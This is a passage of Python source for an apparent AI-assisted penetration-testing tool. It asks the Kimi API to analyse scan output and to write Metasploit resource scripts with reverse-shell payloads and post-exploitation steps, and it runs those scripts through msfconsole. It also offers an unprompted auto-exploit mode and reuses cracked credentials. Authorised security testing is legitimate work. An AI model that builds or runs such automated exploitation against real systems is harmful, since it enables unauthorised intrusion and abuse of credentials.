    Raises RuntimeError on unrecoverable failure.
    """
    api_key = SESSION.get("api_key","")
    if not api_key:
        raise RuntimeError("No API key set. Go to Settings → Set Kimi API Key.")

    payload = json.dumps({
        "model"      : _active_model(),
        "max_tokens" : max_tokens,
        "temperature": 0.3,
        "messages"   : [
            {"role": "system", "content": system_prompt},
            {"role": "user",   "content": user_msg},
        ],
    }).encode()

    last_err = None
    for attempt in range(3):
        req = urllib.request.Request(
            _active_api_url(),
            data    = payload,
            method  = "POST",
            headers = {
                "Content-Type" : "application/json",
                "Authorization": f"Bearer {api_key}",
            },
        )
        try:
            with urllib.request.urlopen(req, timeout=300) as resp:
                data = json.loads(resp.read())
            break
        except urllib.error.HTTPError as e:
            body = e.read().decode(errors="replace")
            if e.code in (429, 500, 502, 503, 504) and attempt < 2:
                last_err = f"HTTP {e.code}: {body[:200]}"
                time.sleep(2 ** attempt * 3)
                continue
            hint = {"401": " — check your Kimi API key (platform.kimi.ai → API Keys).",
                    "404": " — model name may be wrong; check Settings → Kimi model.",
                    "429": " — rate limit or quota exceeded; top up or slow down."}.get(str(e.code), "")
            raise RuntimeError(f"API HTTP {e.code}{hint}\n{body[:300]}")
        except Exception as e:
            last_err = str(e)
            if attempt < 2:
                time.sleep(2 ** attempt * 3)
                continue
            raise RuntimeError(f"API request failed: {e}")
    else:
        raise RuntimeError(f"API request failed after retries: {last_err}")

    try:
        return data["choices"][0]["message"]["content"]
    except (KeyError, IndexError, TypeError) as e:
        raise RuntimeError(f"Unexpected API response shape: {e}\n{str(data)[:400]}")

def _extract_json(text: str) -> str:
    """Strip markdown fences and isolate the JSON object in a model reply."""
    t = re.sub(r"^```[a-z]*\s*", "", text.strip())
    t = re.sub(r"\s*```$", "", t)
    start, end = t.find("{"), t.rfind("}")
    if start != -1 and end > start:
        return t[start:end + 1]
    return t

# ── MSF module ground-truthing ───────────────────────────────────────────────
_MSF_CACHE = {}

def verify_msf_module(module: str):
    """Check a Metasploit module path actually exists in the local install.
    Returns True/False, or None when msfconsole isn't available to check."""
    if not module:
        return None
    if module in _MSF_CACHE:
        return _MSF_CACHE[module]
    if not shutil.which("msfconsole"):
        return None
    try:
        r = subprocess.run(["msfconsole", "-q", "-x", f"info {module}; exit"],
                           capture_output=True, text=True, timeout=90)
        ok = "Name:" in r.stdout and "invalid" not in r.stdout.lower()[:400]
    except Exception:
        ok = None
    _MSF_CACHE[module] = ok
    return ok

def verify_analysis_modules(analysis: dict):
    """Annotate each vuln with _msf_verified (True/False/None)."""
    for v in analysis.get("vulnerabilities", []):
        mod = v.get("msf_module")
        if mod:
            v["_msf_verified"] = verify_msf_module(mod)

def tool_versions() -> dict:
    """Collect version strings of installed tools (feeds AI context)."""
    probes = {"nmap": ["nmap", "--version"], "nikto": ["nikto", "-Version"],
              "gobuster": ["gobuster", "version"], "hydra": ["hydra", "-h"],
              "nuclei": ["nuclei", "-version"], "sqlmap": [sys.executable, "/opt/sqlmap/sqlmap.py", "--version"],
              "msfconsole": ["msfconsole", "--version"]}
    out = {}
    for name, cmd in probes.items():
        if not shutil.which(cmd[0] if cmd[0] != sys.executable else "python3"):
            continue
        if name == "sqlmap" and not Path("/opt/sqlmap/sqlmap.py").exists():
            continue
        try:
            r = subprocess.run(cmd, capture_output=True, text=True, timeout=15)
            first = (r.stdout or r.stderr).strip().splitlines()
            out[name] = first[0][:80] if first else "installed"
        except Exception:
            out[name] = "installed"
    return out


# ── System prompts ─────────────────────────────────────────────────────────
_SYS_ANALYST = """You are an expert penetration tester and security analyst.
You receive raw output from security scanning tools and produce structured,
actionable intelligence for an authorised security assessment.

ALWAYS respond with a JSON object containing exactly these keys:
{
  "summary":        "2-3 sentence executive summary",
  "target":         "identified target IP/hostname",
  "os_guess":       "best OS/version guess or null",
  "open_ports":     [{"port": int, "service": str, "version": str, "risk": "critical|high|medium|low|info"}],
  "vulnerabilities": [
    {
      "id":          "CVE-xxxx-xxxx or descriptive ID",
      "title":       "short title",
      "severity":    "critical|high|medium|low",
      "description": "what it is and why it matters",
      "evidence":    "exact line(s) from scan output that prove this",
      "msf_module":  "exact Metasploit module path or null",
      "msf_options": {"OPTION": "value"},
      "payload_suggestion": "e.g. linux/x64/meterpreter/reverse_tcp or null",
      "explanation": "step-by-step explanation of how this exploit works"
    }
  ],
  "attack_path":    "narrative description of the recommended exploitation chain",
  "remediation":    ["actionable fix 1", "actionable fix 2"]
}

Output ONLY valid JSON. No markdown fences, no preamble, no commentary outside the JSON."""

_SYS_RC_GEN = """You are a Metasploit resource script generator for authorised penetration testing.
Given a vulnerability analysis JSON, produce a Metasploit .rc resource script.

Rules:
- Use ONLY standard Metasploit modules (no custom code)
- Include 'use', 'set', and 'run' / 'exploit -j' commands
- Add 'spool /tmp/niixscan_msf.log' at the top to capture output
- Add 'setg VERBOSE true' for detailed output
- Comment each section explaining what it does and why
- At the end add post-exploitation: 'run post/multi/manage/shell_to_meterpreter'
  and 'run post/multi/recon/local_exploit_suggester' if a session was obtained
- Output ONLY the raw .rc file content. No markdown, no explanation outside comments."""


def ai_analyse_scan(raw_output: str, tool_name: str, target: str) -> dict:
    """Send scan output to Kimi, get structured vulnerability analysis."""
    msg_ai(f"Sending {tool_name} output to Kimi for analysis …")
    spinner_start("Analysing with Kimi …")
    user_msg = (
        f"Tool: {tool_name}\nTarget: {target}\n\n"
        f"=== RAW SCAN OUTPUT ===\n{raw_output[:12000]}\n=== END OUTPUT ==="
    )
    try:
        raw_json = _kimi_request(_SYS_ANALYST, user_msg, max_tokens=4096)
        result   = json.loads(_extract_json(raw_json))
        spinner_stop("Analysis complete.")
        return result
    except json.JSONDecodeError as e:
        spinner_stop("Analysis received (parse warning).")
        msg_wrn(f"JSON parse issue: {e} — storing raw text")
        return {"_raw": raw_json, "summary": "Parse error – see _raw", "vulnerabilities": []}
    except Exception as e:
        spinner_stop(f"Analysis failed: {e}")
        raise


def ai_generate_rc(analysis: dict, lhost: str) -> str:
    """Ask Kimi to generate a Metasploit .rc file from an analysis dict."""
    msg_ai("Generating Metasploit resource script …")
    spinner_start("Kimi is crafting the .rc script …")
    user_msg = (
        f"LHOST (attacker IP): {lhost}\n\n"
        f"VULNERABILITY ANALYSIS:\n{json.dumps(analysis, indent=2)}"
    )
    try:
        rc_content = _kimi_request(_SYS_RC_GEN, user_msg, max_tokens=3000)
        spinner_stop("Resource script generated.")
        return rc_content
    except Exception as e:
        spinner_stop(f"RC generation failed: {e}")
        raise


def display_ai_analysis(analysis: dict):
    """Pretty-print the AI analysis to the terminal."""
    w = _W()
    print(f"\n{PU}{'─'*w}{R}")
    print(f"{PU}{B}  🤖  KIMI AI VULNERABILITY ANALYSIS{R}")
    print(f"{PU}{'─'*w}{R}\n")

    if "_raw" in analysis:
        print(analysis["_raw"]); return

    # Summary
    print(f"  {B}{WH}Executive Summary{R}")
    wrap_print(analysis.get("summary","N/A"))
    print()

    # Target info
    os_g = analysis.get("os_guess","unknown") or "unknown"
    print(f"  {B}{WH}Target{R}   {CY}{analysis.get('target','?')}{R}   OS guess: {YL}{os_g}{R}\n")

    # Open ports
    ports = analysis.get("open_ports",[])
    if ports:
        print(f"  {B}{WH}Open Ports / Services{R}")
        for p in ports:
            risk_col = {"critical":RD,"high":OR,"medium":YL,"low":GR,"info":DIM}.get(
                p.get("risk","info"), DIM)
            print(f"    {risk_col}●{R}  {B}{p.get('port','?'):<6}{R}"
                  f"{p.get('service','?'):<16} {DIM}{p.get('version','')}{R}")
        print()

    # Vulnerabilities
    vulns = analysis.get("vulnerabilities",[])
    if not vulns:
        msg_wrn("No exploitable vulnerabilities identified."); return

    print(f"  {B}{WH}Vulnerabilities ({len(vulns)} found){R}\n")
    for i, v in enumerate(vulns, 1):
        sev = v.get("severity","info")
        sc  = {"critical":RD,"high":OR,"medium":YL,"low":GR,"info":DIM}.get(sev, DIM)
        print(f"  {sc}{B}[{i}] {v.get('id','?')}  ·  {sev.upper()}{R}")
        print(f"      {B}{v.get('title','')}{R}")
        wrap_print(v.get("description",""), indent=6)
        print(f"\n      {DIM}Evidence:{R}  {v.get('evidence','')[:120]}")
        if v.get("msf_module"):
            ver = v.get("_msf_verified")
            tag = (f"  {GR}[verified locally ✔]{R}" if ver is True else
                   f"  {RD}[NOT FOUND in local Metasploit ✗]{R}" if ver is False else "")
            print(f"      {GR}MSF Module:{R} {v['msf_module']}{tag}")
        if v.get("explanation"):
            print(f"\n      {PU}How it works:{R}")
            wrap_print(v["explanation"], indent=6)
        print()

    # Attack path
    ap = analysis.get("attack_path","")
    if ap:
        print(f"  {B}{WH}Recommended Attack Path{R}")
        wrap_print(ap); print()

    # Remediation
    rems = analysis.get("remediation",[])
    if rems:
        print(f"  {B}{WH}Remediation{R}")
        for r in rems:
            print(f"    {GR}•{R} {r}")
    print(f"\n{PU}{'─'*w}{R}\n")


# ══════════════════════════════════════════════════════════════════════════════
#  METASPLOIT INTEGRATION
# ══════════════════════════════════════════════════════════════════════════════
def install_metasploit():
    """Install Metasploit Framework for the detected distro."""
    msg_inf("Installing Metasploit Framework …")
    if DISTRO_FAMILY in ("debian",):
        # Official rapid7 installer
        script = "/tmp/msfinstall"
        spinner_start("Downloading Metasploit installer …")
        try:
            urllib.request.urlretrieve(
                "https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb",
                script)
            os.chmod(script, 0o755)
            spinner_stop("Installer downloaded.")
            _run(["sudo", "bash", script])
        except Exception as e:
            spinner_stop(f"Download failed: {e}")
            msg_wrn("Falling back to package manager …")
            _apt_update()
            install_pkg("metasploit")
    elif DISTRO_FAMILY == "arch":
        install_pkg("metasploit")
    elif DISTRO_FAMILY == "fedora":
        # Enable EPEL first
        _run_q(["sudo", _pkg("dnf") if shutil.which("dnf") else "yum",
                "install", "-y", "epel-release"])
        install_pkg("metasploit")
    if not shutil.which("msfconsole"):
        msg_wrn("msfconsole not found after install. You may need to add it to PATH.")
    else:
        msg_ok("Metasploit installed.")


def run_rc_script(rc_path: str):
    """Execute a Metasploit resource script via msfconsole."""
    if not shutil.which("msfconsole"):
        msg_err("msfconsole not found. Install Metasploit first.")
        return
    print(f"\n  {RD}{B}[ METASPLOIT EXECUTION ]{R}")
    print(f"  {DIM}Resource script: {rc_path}{R}")
    print(hline())
    _run(["msfconsole", "-q", "-r", rc_path])
    print(hline())

_SESSION_RE = re.compile(r"(meterpreter|shell|command shell)\s+session\s+\d+\s+opened",
                         re.IGNORECASE)

def run_rc_captured(rc_path: str, timeout: int = 900) -> tuple:
    """Run an .rc non-interactively, capturing output. Returns (output, session_opened)."""
    try:
        r = subprocess.run(["msfconsole", "-q", "-r", rc_path],
                           capture_output=True, text=True, timeout=timeout)
        out = (r.stdout or "") + (r.stderr or "")
    except subprocess.TimeoutExpired:
        out = "(timed out)"
    return out, bool(_SESSION_RE.search(out))


def _display_rc(rc_content: str):
    """Pretty-print a .rc script with syntax colouring."""
    print(f"\n{hline('─', YL)}")
    for ln in rc_content.splitlines():
        s = ln.strip()
        if s.startswith("#"):           print(f"  {DIM}{ln}{R}")
        elif s.lower().startswith("use"):    print(f"  {CY}{ln}{R}")
        elif s.lower().startswith("set"):    print(f"  {YL}{ln}{R}")
        elif s.lower().startswith("run") or s.lower().startswith("exploit"):
                                        print(f"  {GR}{B}{ln}{R}")
        else:                           print(f"  {WH}{ln}{R}")
    print(hline("─", YL))


def _save_rc(rc_content: str) -> Path:
    """Save .rc to the configured output dir and return its path."""
    ts      = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    out_dir = Path(load_cfg().get("output_dir","~/niixscan-results")).expanduser()
    out_dir.mkdir(parents=True, exist_ok=True)
    p = out_dir / f"niix_{ts}.rc"
    p.write_text(rc_content)
    msg_ok(f"Resource script saved → {p}")
    return p


# ─────────────────────────────────────────────────────────────────────────────
#  STEP-THROUGH EXPLOITATION WIZARD
#  Walks the user through each vulnerability one by one, letting them decide
#  at every stage: skip, customise options, generate payload, or execute.
# ─────────────────────────────────────────────────────────────────────────────

_SYS_STEP = """You are an expert Metasploit operator guiding an authorised penetration test.
Given ONE vulnerability entry from a structured analysis JSON, produce a concise
step-by-step plan and a single self-contained Metasploit .rc resource script.

Respond ONLY with a JSON object containing exactly:
{
  "steps": [
    {"num": 1, "action": "short action label", "detail": "what this step does and why"},
    ...
  ],
  "rc_script": "full .rc file content as a single string with \\n newlines",
  "notes": "any important warnings, alternative approaches, or conditions"
}

Rules for rc_script:
- spool /tmp/niixscan_<module_name>.log at the top
- setg VERBOSE true
- One 'use <module>' block with all SET options and LPORT 4444 unless specified
- End with 'exploit -j' for background jobs or 'run' for foreground
- Add post/multi/recon/local_exploit_suggester if a session is likely
Output ONLY valid JSON. No markdown fences."""


def ai_step_plan(vuln: dict, lhost: str) -> dict:
    """Ask Kimi for a step-by-step plan + rc for a single vulnerability."""
    spinner_start(f"Kimi planning exploit for {vuln.get('id','?')} …")
    # Ground-truth feedback: local tool versions + prior exploit outcomes
    context = {"tool_versions": tool_versions()}
    prior = [e for e in SESSION.get("exploit_log", [])
             if e.get("vuln_id") == vuln.get("id")]
    if prior:
        context["prior_attempts_for_this_vuln"] = prior
        context["instruction"] = ("These attempts already ran. If one failed, "
                                  "do NOT repeat the same module/options — adjust "
                                  "payload, options, or pick another approach.")
    creds = db_creds_for(SESSION.get("target", ""))
    if creds:
        context["known_credentials"] = [
            {"service": s, "username": u, "password": p} for s, u, p in creds]
        context["credential_instruction"] = ("Valid credentials were already cracked "
                                             "for this target — prefer modules that "
                                             "can use them (e.g. ssh_login, psexec).")
    user_msg = (
        f"LHOST: {lhost}\n"
        f"TARGET: {SESSION.get('target','unknown')}\n\n"
        f"ENVIRONMENT CONTEXT:\n{json.dumps(context, indent=2)}\n\n"
        f"VULNERABILITY:\n{json.dumps(vuln, indent=2)}"
    )
    try:
        raw = _kimi_request(_SYS_STEP, user_msg, max_tokens=2500)
        result = json.loads(_extract_json(raw))
        spinner_stop("Plan ready.")
        return result
    except json.JSONDecodeError as e:
        spinner_stop("Received (parse warning).")
        return {"steps": [], "rc_script": raw, "notes": f"JSON parse error: {e}"}
    except Exception as e:
        spinner_stop(f"Failed: {e}")
        raise


def _vuln_wizard_single(vuln: dict, idx: int, total: int, lhost: str):
    """
    Interactive wizard for ONE vulnerability.
    Returns True to continue to the next, False to abort the whole pipeline.
    """
    sev = vuln.get("severity","info")
    sc  = {"critical":RD,"high":OR,"medium":YL,"low":GR,"info":DIM}.get(sev, DIM)

    while True:
        banner()
        w = _W()
        print(f"\n  {sc}{B}[ VULNERABILITY {idx}/{total} ]{R}  "
              f"{CY}{vuln.get('id','?')}{R}  —  {sc}{B}{sev.upper()}{R}")
        print(f"  {B}{vuln.get('title','')}{R}\n")
        wrap_print(vuln.get("description",""), indent=4)
        print()

        msf = vuln.get("msf_module")
        payload = vuln.get("payload_suggestion")
        opts    = vuln.get("msf_options", {})

        print(f"  {DIM}Evidence :{R} {vuln.get('evidence','')[:120]}")
        print(f"  {DIM}MSF module:{R} {GR if msf else RD}{msf or 'none identified'}{R}")
        print(f"  {DIM}Payload   :{R} {payload or 'not specified'}")
        if opts:
            print(f"  {DIM}Options   :{R} " +
                  "  ".join(f"{k}={v}" for k,v in opts.items()))
        print()

        if vuln.get("explanation"):
            print(f"  {PU}{B}How this exploit works:{R}")
            wrap_print(vuln["explanation"], indent=4)
            print()

        print(hline())
        print(f"  {CY}1{R})  🤖  Get step-by-step plan + generate .rc script")
        print(f"  {CY}2{R})  ▶   Run .rc with msfconsole now")
        print(f"  {CY}3{R})  ✏   Edit .rc options before running")
        print(f"  {CY}4{R})  ⏭   Skip — move to next vulnerability")
        print(f"  {CY}5{R})  📋  View last generated .rc for this vuln")
        print(f"  {CY}0{R})  ✕   Abort exploitation pipeline\n")

        ch = input(f"  {CY}»{R} ").strip()

        if ch == "1":
            if not msf:
                msg_wrn("No MSF module identified for this vulnerability.")
                msg_wrn("Kimi will attempt to suggest the best available approach.")
            try:
                plan = ai_step_plan(vuln, lhost)
            except Exception as e:
                msg_err(str(e)); pause(); continue

            # Store on the vuln dict for option 5
            vuln["_plan"]      = plan
            vuln["_rc_content"] = plan.get("rc_script","")

            # Display steps
            banner()
            print(f"\n  {PU}{B}[ EXPLOITATION PLAN — {vuln.get('id','?')} ]{R}\n")
            for step in plan.get("steps",[]):
                print(f"  {CY}{step['num']:>2}{R})  {B}{step['action']}{R}")
                wrap_print(step.get("detail",""), indent=8)
                print()

            if plan.get("notes"):
                print(f"  {YL}{B}Notes:{R}")
                wrap_print(plan["notes"], indent=4)
                print()

            # Show the .rc
            print(f"\n  {B}{WH}Generated .rc Script:{R}")
            _display_rc(vuln["_rc_content"])

            # Save it
            rc_path = _save_rc(vuln["_rc_content"])
            vuln["_rc_path"] = str(rc_path)
            pause()

        elif ch == "2":
            rc_path = vuln.get("_rc_path")
            if not rc_path:
                msg_wrn("No .rc script yet. Choose option 1 first to generate one.")
                pause(); continue
            if not shutil.which("msfconsole"):
                msg_wrn("msfconsole not found. Installing …")
                install_metasploit()
            if shutil.which("msfconsole"):
                run_rc_script(rc_path)
                # Record outcome for AI feedback loop
                outcome = ask("Result? (session/failed/partial)", "failed").lower()
                note    = ask("Short note (what happened)", "")
                SESSION["exploit_log"].append({
                    "vuln_id": vuln.get("id", "?"), "module": vuln.get("msf_module"),
                    "outcome": outcome, "note": note, "when": _now()})
                _checkpoint()
                if outcome == "session":
                    msg_ok("Session obtained — logged for post-exploitation steps.")
            else:
                msg_err("Metasploit install failed.")
            pause()

        elif ch == "3":
            rc_path = vuln.get("_rc_path")
            if not rc_path or not Path(rc_path).exists():
                msg_wrn("Generate the .rc first (option 1)."); pause(); continue
            # Let user edit with $EDITOR or nano
            editor = os.environ.get("EDITOR", "nano")
            msg_inf(f"Opening {rc_path} in {editor} …")
            _run([editor, rc_path])
            msg_ok("Edits saved.")
            pause()

        elif ch == "4":
            return True  # next vuln

        elif ch == "5":
            rc = vuln.get("_rc_content","")
            if not rc:
                msg_wrn("No .rc generated yet. Use option 1 first.")
            else:
                _display_rc(rc)
            pause()

        elif ch == "0":
            return False  # abort pipeline


def msf_pipeline(target: str, analysis: dict):
    """
    Full AI → Step-Through → MSF pipeline.
    Presents each vulnerability one at a time and walks the user through
    every decision without requiring them to write any code.
    """
    banner()
    print(f"\n  {PU}{B}[ 🤖  AI-GUIDED EXPLOITATION PIPELINE ]{R}\n")

    if not SESSION["api_key"]:
        msg_err("No Kimi API key. Go to Settings → Set Kimi API Key."); pause(); return
    if not analysis:
        msg_err("No AI analysis. Run a scan + AI Analysis first."); pause(); return

    vulns = analysis.get("vulnerabilities", [])
    if not vulns:
        msg_wrn("No exploitable vulnerabilities found in the current analysis.")
        pause(); return

    # Show overview of all vulns before starting
    print(f"  {B}{WH}Vulnerabilities ready for exploitation:{R}\n")
    for i, v in enumerate(vulns, 1):
        sev = v.get("severity","info")
        sc  = {"critical":RD,"high":OR,"medium":YL,"low":GR,"info":DIM}.get(sev,DIM)
        msf_tag = f"{GR}[MSF]{R}" if v.get("msf_module") else f"{DIM}[no module]{R}"
        print(f"  {CY}{i:>2}{R})  {sc}{B}{sev.upper():<10}{R}  "
              f"{v.get('id','?'):<28}  {msf_tag}")
    print()

    lhost = ask("Your attacker IP (LHOST)", _get_local_ip())
    print()

    print(f"  {CY}1{R})  Step through ALL vulnerabilities one by one")
    print(f"  {CY}2{R})  Pick a specific vulnerability by number")
    print(f"  {CY}0{R})  ← Back\n")
    mode = input(f"  {CY}»{R} ").strip()

    if mode == "0":
        return

    elif mode == "2":
        nums = ask("Enter vulnerability number(s) separated by commas", "1")
        selected = []
        for n in nums.split(","):
            n = n.strip()
            if n.isdigit() and 1 <= int(n) <= len(vulns):
                selected.append(vulns[int(n)-1])
            else:
                msg_wrn(f"Invalid number: {n}")
        if not selected:
            msg_err("No valid vulnerabilities selected."); pause(); return
        vulns_to_run = selected

    else:  # mode "1" or anything else
        vulns_to_run = vulns

    # Walk through each selected vuln
    for i, vuln in enumerate(vulns_to_run, 1):
        cont = _vuln_wizard_single(vuln, i, len(vulns_to_run), lhost)
        if not cont:
            msg_wrn("Pipeline aborted by user.")
            pause(); return

    banner()
    msg_ok("Exploitation pipeline complete.")
    msg_inf(f"All generated .rc scripts are in: "
            f"{Path(load_cfg().get('output_dir','~/niixscan-results')).expanduser()}")
    pause()


def _smart_wordlist(url: str) -> str:
    """Pick a wordlist based on what's already known about the target
    (service fingerprints stored in the findings DB)."""
    candidates = ["/usr/share/wordlists/dirb/common.txt"]
    host = urlparse(url).hostname or url
    try:
        info = db_summary(host)
        blob = " ".join(f"{s} {v}" for _, _, s, v in info["ports"]).lower()
        scan = " ".join(SESSION["scan_results"].values()).lower()
        text = blob + " " + scan
        if "wordpress" in text or "wp-" in text:
            candidates.insert(0, "/usr/share/wordlists/dirb/wordpress.txt")
        if "microsoft-iis" in text or "asp.net" in text:
            candidates.insert(0, "/usr/share/wordlists/dirb/iis.txt")
        if "apache" in text or "nginx" in text:
            candidates.insert(0, "/usr/share/wordlists/dirb/apache.txt")
        candidates += ["/usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt",
                       "/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt"]
    except Exception:
        pass
    for c in candidates:
        if Path(c).is_file():
            return c
    return candidates[-1]

def _check_wordlist(path: str) -> str:
    """Verify a wordlist exists; fall back to the configured default if not."""
    if path and Path(path).is_file():
        return path
    fallback = load_cfg().get("wordlist", "")
    if fallback and Path(fallback).is_file():
        msg_wrn(f"Wordlist not found: {path} — using configured default: {fallback}")
        return fallback
    msg_err(f"Wordlist not found: {path}")
    return ""

def _get_local_ip() -> str:
    """Detect the real local IP — UDP-connect trick first, then hostname
    resolution, then the default-route interface via `ip route`."""
    import socket
    try:                                        # 1) outbound-interface trick
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]; s.close()
        if ip and not ip.startswith("127."):
            return ip
    except Exception:
        pass
    try:                                        # 2) hostname resolution
        ip = socket.gethostbyname(socket.gethostname())
        if ip and not ip.startswith("127."):
            return ip
    except Exception:
        pass
    try:                                        # 3) parse the default route
        r = subprocess.run(["ip", "-4", "route", "get", "1.1.1.1"],
                           capture_output=True, text=True, timeout=5)
        m = re.search(r"\bsrc\s+([\d.]+)", r.stdout)
        if m:
            return m.group(1)
    except Exception:
        pass
    return "127.0.0.1"


# ══════════════════════════════════════════════════════════════════════════════
#  PENTEST REPORT GENERATOR
# ══════════════════════════════════════════════════════════════════════════════
_SYS_REPORT = """You are a professional penetration test report writer.
Given structured vulnerability data, write a formal, detailed pentest report.
Use plain text with clear sections. Include:
- Executive Summary
- Scope & Methodology
- Findings (one section per vulnerability with severity, description, evidence, impact, remediation)
- Risk Matrix summary
- Conclusion & Recommendations
Be thorough but concise. Use professional language appropriate for both technical
and non-technical readers. Do NOT use markdown formatting — plain text with
section headers using ═══ underlines."""

def generate_report(target: str, scan_results: dict, analysis: dict) -> str:
    """Ask Kimi to produce a full pentest report."""
    if not SESSION["api_key"]:
        raise RuntimeError("No API key.")
    user_msg = (
        f"Target: {target}\n"
        f"Assessment Date: {datetime.datetime.now().strftime('%Y-%m-%d')}\n\n"
        f"SCAN DATA SUMMARY:\n"
        + "\n".join(f"\n[{k}]\n{v[:3000]}" for k,v in scan_results.items())
        + f"\n\nSTRUCTURED ANALYSIS:\n{json.dumps(analysis, indent=2)[:6000]}"
    )
    spinner_start("Kimi is writing the pentest report …")
    try:
        report = _kimi_request(_SYS_REPORT, user_msg, max_tokens=8000)
        spinner_stop("Report complete.")
        return report
    except Exception as e:
        spinner_stop(f"Report generation failed: {e}")
        raise


def save_report_menu():
    """Generate and save the full pentest report."""
    banner()
    print(f"\n  {PU}{B}[ PENTEST REPORT GENERATOR ]{R}\n")

    if not SESSION["api_key"]:
        msg_err("No API key. Set it in Settings first."); pause(); return
    if not SESSION["scan_results"]:
        msg_err("No scan results available. Run scans first."); pause(); return

    target   = SESSION["target"] or ask("Target (for report header)", "unknown")
    analysis = SESSION.get("ai_report") or {}

    try:
        report = generate_report(target, SESSION["scan_results"], analysis)
    except Exception as e:
        msg_err(str(e)); pause(); return

    # Save
    ts      = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    out_dir = Path(load_cfg().get("output_dir","~/niixscan-results")).expanduser()
    out_dir.mkdir(parents=True, exist_ok=True)
    rpt_path = out_dir / f"pentest_report_{ts}.txt"
    rpt_path.write_text(report)
    msg_ok(f"Report saved → {rpt_path}")

    # Preview
    print(f"\n{hline('─', PU)}")
    for line in report.splitlines()[:60]:
        print(f"  {line}")
    if len(report.splitlines()) > 60:
        print(f"\n  {DIM}… (truncated, full report in file) …{R}")
    print(hline("─", PU))
    pause()


# ══════════════════════════════════════════════════════════════════════════════
#  AI ANALYSIS MENU  (standalone — analyse stored scan results)
# ══════════════════════════════════════════════════════════════════════════════
def _ensure_analysis() -> bool:
    """Make sure SESSION['ai_report'] is populated. Returns True on success."""
    if SESSION.get("ai_report"):
        return True
    stored = SESSION["scan_results"]
    if not stored:
        msg_err("No scan results stored. Run a scan first."); return False
    if not SESSION["api_key"]:
        msg_err("No API key. Go to Settings first."); return False
    combined = "\n\n".join(f"=== {k} ===\n{v}" for k, v in stored.items())
    target   = SESSION["target"] or "unknown"
    banner()
    try:
        SESSION["ai_report"] = ai_analyse_scan(combined, "multi-tool", target)
        return True
    except Exception as e:
        msg_err(str(e)); return False


def ai_analysis_menu():
    while True:
        banner()
        print(f"\n  {PU}{B}[ 🤖  AI ANALYSIS & EXPLOITATION CENTRE ]{R}\n")

        stored   = SESSION["scan_results"]
        analysis = SESSION.get("ai_report")
        vulns    = analysis.get("vulnerabilities", []) if analysis else []

        # ── Status panel ──────────────────────────────────────────────
        if stored:
            print(f"  {B}{WH}Stored scan data:{R}")
            for k, v in stored.items():
                print(f"    {GR}●{R} {k:<20} {DIM}({len(v):,} chars){R}")
            print()
        else:
            msg_wrn("No scan results stored yet — run a scan tool first.\n")

        if analysis and "_raw" not in analysis:
            sev_counts = {}
            for v in vulns:
                s = v.get("severity","info")
                sev_counts[s] = sev_counts.get(s, 0) + 1
            counts_plain = ", ".join(
                f"{n} {s}" for s, n in sorted(sev_counts.items(),
                key=lambda x: ["critical","high","medium","low","info"].index(x[0])
                    if x[0] in ["critical","high","medium","low","info"] else 9))
            print(f"  {B}{WH}AI Analysis:{R}  {GR}ready{R}  "
                  f"—  {len(vulns)} vulns  ({counts_plain})")
            print()
        elif analysis:
            print(f"  {YL}AI Analysis:{R} raw text (JSON parse issue)\n")
        else:
            print(f"  {RD}AI Analysis:{R} not run yet\n")

        # ── Menu ──────────────────────────────────────────────────────
        print(hline())
        print(f"  {CY}1{R})  🔍  Analyse stored scans with Kimi AI")
        print(f"  {CY}2{R})  📋  View last AI analysis report")
        print(f"  {CY}3{R})  ⚔   Step-through exploitation wizard  "
              f"{DIM}(picks each vuln, generates payload, runs MSF){R}")
        print(f"  {RD}4{R})  🤖  AUTO-EXPLOIT  "
              f"{DIM}(verified modules, severity-gated, no prompts){R}")

        # Dynamic per-vuln quick-launch entries
        if vulns:
            print(f"\n  {DIM}── Quick exploit by vulnerability ──{R}")
            for i, v in enumerate(vulns, 1):
                sev = v.get("severity","info")
                sc  = {"critical":RD,"high":OR,"medium":YL,
                       "low":GR,"info":DIM}.get(sev, DIM)
                msf_tag = f"{GR}[MSF ✔]{R}" if v.get("msf_module") else f"{DIM}[no module]{R}"
                print(f"  {CY}{i+4:>2}{R})  {sc}{B}{sev.upper():<10}{R}  "
                      f"{v.get('id','?'):<28} {msf_tag}")
            print()

        print(f"  {CY} R{R})  📄  Generate full pentest report")
        print(f"  {CY} C{R})  🗑   Clear stored results & analysis")
        print(f"  {CY} 0{R})  ←   Back\n")
        ch = input(f"  {CY}»{R} ").strip().lower()

        # ── Handlers ─────────────────────────────────────────────────
        if ch == "1":
            if not stored:
                msg_err("No scan data."); pause(); continue
            if not SESSION["api_key"]:
                msg_err("No API key set in Settings."); pause(); continue
            combined = "\n\n".join(f"=== {k} ===\n{v}" for k, v in stored.items())
            target   = SESSION["target"] or ask("Target (for context)", "unknown")
            banner()
            try:
                analysis = ai_analyse_scan(combined, "multi-tool", target)
                SESSION["ai_report"] = analysis
                display_ai_analysis(analysis)
            except Exception as e:
                msg_err(str(e))
            pause()

        elif ch == "2":
            if not analysis:
                msg_err("No analysis yet. Use option 1 first."); pause(); continue
            banner()
            display_ai_analysis(analysis)
            pause()

        elif ch == "3":
            if not _ensure_analysis(): pause(); continue
            msf_pipeline(SESSION["target"] or "unknown", SESSION["ai_report"])

        elif ch == "4":
            if not _ensure_analysis(): pause(); continue
            auto_exploit(SESSION["target"] or "unknown", SESSION["ai_report"])

        elif ch.isdigit() and int(ch) >= 5:
            # Quick per-vuln exploit
            idx = int(ch) - 4  # maps option 5 → vuln[0], 6 → vuln[1], etc.
            if not vulns:
                msg_err("No vulnerabilities. Run analysis first."); pause(); continue
            if 1 <= idx <= len(vulns):
                lhost = ask("Your attacker IP (LHOST)", _get_local_ip())
                _vuln_wizard_single(vulns[idx-1], idx, len(vulns), lhost)
            else:
                msg_err("Invalid option."); time.sleep(0.4)

        elif ch == "r":
            save_report_menu()

        elif ch == "c":
            SESSION["scan_results"] = {}; SESSION["ai_report"] = None
            msg_ok("Cleared."); time.sleep(0.5)

        elif ch == "0":
            break

        else:
            msg_err("Invalid option."); time.sleep(0.4)


def _find_free_port(start: int = 4444) -> int:
    """First free TCP port from `start` upward (for reverse-shell LPORTs)."""
    import socket
    for p in range(start, start + 200):
        try:
